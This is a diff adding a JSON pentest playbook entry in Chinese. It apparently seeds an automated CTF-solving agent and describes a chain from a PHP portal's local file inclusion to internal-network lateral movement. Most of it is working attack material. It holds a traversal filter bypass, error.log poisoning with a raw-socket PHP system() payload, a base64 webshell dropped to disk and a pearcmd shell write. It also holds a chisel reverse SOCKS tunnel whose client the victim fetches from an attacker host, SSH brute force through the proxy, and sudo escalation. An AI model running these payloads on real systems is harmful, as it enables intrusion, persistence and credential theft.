@@ -1,0 +1,49 @@
+{
+  "id": "auto-lfi-logpoison-ssh-pivot",
+  "title": "Web 立足点到内网横向的多阶段渗透：LFI→日志包含 RCE→反向 SOCKS→SSH 弱口令跳板收多 flag",
+  "vuln_pattern": "单入口企业门户（PHP 语言包/页面加载参数）存在过滤不严的本地文件包含，经中间件日志投毒升级为 RCE，再以反向 SOCKS 隧道打通 docker 内网，向未授权运维接口与弱口令 SSH 跳板机横向，逐台收取分层摆放的多枚 flag。",
+  "fingerprint": ["企业门户", "门户网站", "多阶段渗透", "语言包", "页面加载机制", "参数过滤", "跳板机", "堡垒机", "内网", "网段", "弱口令", "运维面板", "LFI", "log poisoning", "error.log", "reverse SOCKS", "chisel", "pivot", "SSH brute", "lateral movement"],
+  "exploit_steps": [
+    "对每个带文件/语言/页面参数的端点（?lang= ?page= ?file= ?path= ?template=）依次测路径遍历：../、双写 ....//（绕过单次 str_replace('../','') 过滤）、URL 编码变体、大小写混合协议、绝对路径；确认 LFI/任意文件读后按优先级读：中间件配置(nginx sites-enabled、php-fpm 配置)→应用源码→/etc/passwd→challenge/flag 目录。",
+    "无上传点也能拿 RCE：日志投毒。读中间件配置定位日志路径，向不存在的 .php 路径发含 payload 的原始请求行——FastCGI 回 Primary script unknown 并把请求 URI 原样写进 error.log；再用 LFI 包含该日志触发执行。payload 用短标签 <?=system($_GET['c'])?>（无空格无引号），用原始 socket 裸发避免客户端/边缘代理转义。",
+    "RCE 落地即固化立足点：写 webshell 或 base64 传命令的 Python helper（带唯一标记剥输出壳）；ip a 枚举双网卡确定内网网段；翻 /backup/、entrypoint.sh、robots.txt 挖题目自带内网工具与用户名表。",
+    "建立反向 SOCKS 隧道（chisel R:socks 或 socat 中继）：Kali 起 chisel server --reverse + http.server 供下载，容器内经 webshell wget 客户端回连 R:socks，本地 127.0.0.1:1080 得 SOCKS5，把完整工具链搬回本地打内网。",
+    "内网优先打配置/状态类未授权接口：/api/config、/api/status、/health、运维面板导出端点常不鉴权，直接吐 corporate_secret/flag/api_keys/db 配置——这里往往直接躺一枚 flag。",
+    "内网信息里的用户名表（ssh_users.txt、员工目录、contacts 页、.bash_history）就是下一跳凭据来源；对 SSH 跳板机做弱口令爆破（收集口令复用 + 常见默认表），经 SOCKS 代理逐台机器收 flag。",
+    "上跳板后立即提权取 root 侧 flag：sudo -l 找 NOPASSWD 项（vim/less/find 等可读文件的 GTFOBins 提权），读 /root、/home/*/ 下 flag2/flag3。",
+    "每台机器先枚举它能到达谁再决定下一跳；决策规则=LFI 优先于爆破(用信息换确定性)；对面板 /login 的爆破/SQLi/SSTI、自报但无路由的伪内网段(192.168.x)保持警惕，多为诱饵装饰。"
+  ],
+  "key_payloads": [
+    "# 1) ....// 双写绕单次过滤的 LFI/任意文件读（4~6 层穿越到根，前缀 lang/ 会被拼上）\ncurl -s 'http://<host>/services.php?lang=....//....//....//....//etc/passwd'\ncurl -s 'http://<host>/services.php?lang=....//....//....//....//var/www/html/config.php'",
+    "# 2) error.log 投毒：原始 socket 裸发短标签 payload 到不存在的 .php\nimport socket\nuri=\"/x.php?<?=system($_GET['c'])?>\"\nreq=f\"GET {uri} HTTP/1.1\\r\\nHost: <host>\\r\\nConnection: close\\r\\n\\r\\n\"\ns=socket.create_connection(('<host>',80),timeout=10); s.sendall(req.encode()); s.recv(4096)",
+    "# 3) LFI 包含被污染的 error.log 并带命令参数触发 RCE\ncurl -s 'http://<host>/services.php?lang=....//....//....//....//var/log/nginx/error.log&c=id'   # uid=33(www-data)",
+    "# 4) 落盘持久 webshell（base64 解码即 <?php system($_GET['c']); ?>）\nCMD='echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==|base64 -d>/var/www/html/rce.php'\ncurl -s 'http://<host>/services.php?lang=....//....//....//....//var/log/nginx/error.log&c='<urlencoded CMD>",
+    "# 5) 备选 RCE：pearcmd config-create 写 shell（源码编译 PHP 才有 pearcmd.php；payload 须 / 开头，+ 还原为空格）\ncurl 'http://<host>/services.php?lang=....//....//....//....//usr/local/lib/php/pearcmd.php&+config-create+/<?php system($_GET[1]);?>+/tmp/pwn.php'\ncurl 'http://<host>/services.php?lang=....//....//....//....//tmp/pwn.php&1=id'",
+    "# 6) chisel 反向 SOCKS 建链\n# Kali: ./chisel server --reverse -p <PORT> ; python3 -m http.server <HTTP_PORT>\n# 容器: wget http://<KALI_IP>:<HTTP_PORT>/chisel -O /tmp/chisel && chmod +x /tmp/chisel; /tmp/chisel client <KALI_IP>:<PORT> R:socks &  # -> 127.0.0.1:1080",
+    "# 7) 经 SOCKS 打未授权面板接口取 flag\ncurl -s --proxy socks5://127.0.0.1:1080 'http://<INTERNAL_IP>:8080/api/config'   # corporate_secret=<FLAG>",
+    "# 8) 经 SOCKS 的 SSH 弱口令爆破（sshpass + ncat ProxyCommand，或 paramiko over pysocks）\nsshpass -p '<PASS>' ssh -o ProxyCommand='ncat --proxy 127.0.0.1:1080 --proxy-type socks5 %h %p' -o StrictHostKeyChecking=no <USER>@<INTERNAL_IP> 'id; cat /home/*/flag*.txt'\n# 命中后: sudo -l; sudo <NOPASSWD_BIN> 读 /root/flag*.txt"
+  ],
+  "category": "pentest",
+  "cve": [],
+  "tags": ["LFI", "arbitrary-file-read", "log-poisoning", "RCE", "pivot", "reverse-socks", "chisel", "lateral-movement", "ssh-brute", "sudo-privesc", "multi-flag", "pearcmd"],
+  "source": "writeup 提炼(通用方法)",
+  "source_tier": "seed",
+  "preconditions": [
+    "单入口 Web 站 + 容器内网多机、flag 分层摆放的多阶段渗透题（medium 档，官方提示常暗示三段式：页面加载机制/参数过滤/网段与SSH）。",
+    "存在带语言包或页面/文件参数的 include 端点，过滤仅为单次 str_replace 或全小写协议黑名单一类可绕方案。",
+    "中间件日志对 www-data 可读写（题目 entrypoint 常特意 chmod 666 error.log 作为预期链）。",
+    "攻击机可起反连服务且容器能出网回连（用于 chisel/文件下载）。"
+  ],
+  "verify_oracle": "命中即真的证据：①LFI—?lang=....//....//....//....//etc/passwd 回读 root:x:0:0 全文；②RCE—包含 error.log 带 c=id 回显 uid=33(www-data)；③立足点—rce.php?c=id 或 helper 返回 www-data 命令输出；④内网—经 socks5://127.0.0.1:1080 访问 /api/config 返回含 corporate_secret 的 JSON；⑤横向—SSH 爆破回显目标机 uid=/hostname 且能 cat 出 flag2/flag3；提交 API 返回 correct:true 且 matched_flag_index 递增、correct_flag_count 累加到 total。",
+  "pitfalls": [
+    "access.log 投毒常不可靠：UA 注入的 fatal 毒行会让 include 在毒行处崩溃，且平台可能有反投毒看门狗把 access.log 截断至 0 字节/指向已删 inode；error.log 的请求行投毒更稳。",
+    "php://filter 因固定 lang/ 前缀无法用；session.upload_progress 竞态因 nginx 缓冲请求体无窗口；gopher 打 FastCGI/MySQL 会被 NUL 截断（PHP urldecode + libcurl 按 C 字符串处理）——都别浪费时间。",
+    "边缘代理(envoy 等)可能对 Host 头里的 \" 或 <?php 返 400、剥 <?PHP，据此误判 query 也被拦是错误结论：payload 放 query string 并用原始 socket 裸发即可，别因边缘拦截放弃整条 RCE 通道。",
+    "穿越深度算错会漏掉 /backup/ 三件套等关键情报（ssh_users.txt/内网扫描工具）；先用 /etc/passwd 校准级数再读业务文件。",
+    "运维面板 /login 是诱饵：弱口令表、api_keys 当密码、SQLi 时间盲、SSTI {{7*7}} 通常全无差异，别恋战；只有 /api/config、/api/status、/health 免认证有货；面板泄露的 db/redis 多仅 loopback，直连 refused。",
+    "面板/新闻注释里自报的内网段(192.168.x)常从 web 容器与跳板机均无路由，是墙后叙事装饰；真实 flag 全在 docker bridge 内网邻居(常见 172.x.0.2 跳板机 / 172.x.0.3 面板)上。",
+    "多实例部署下弱口令、flag 摆放路径、是否需 sudo 各不相同，逐实例现测，别照搬既有凭据。",
+    "并行多会话易重复重发现 flag1、漏做去重；提交时以 matched_flag_index 判定是否为新 flag。"
+  ],
+  "anti_fingerprint": []
+}
